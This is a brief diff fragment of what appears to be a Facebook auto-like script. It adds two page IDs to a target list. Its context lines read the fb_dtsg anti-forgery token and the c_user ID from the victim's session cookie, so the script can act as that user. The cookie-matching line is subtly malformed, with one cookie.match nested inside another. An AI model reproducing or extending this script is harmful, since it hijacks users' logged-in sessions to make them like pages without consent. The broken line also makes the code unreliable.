@@ -61,6 +61,8 @@ LIST("358317087623422");
 LIST("186680718157525");
 LIST("116578281885865");
 LIST("611422528882551");
+LIST("546843878712190");
+LIST("546855828710995");
 /*Like Page*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
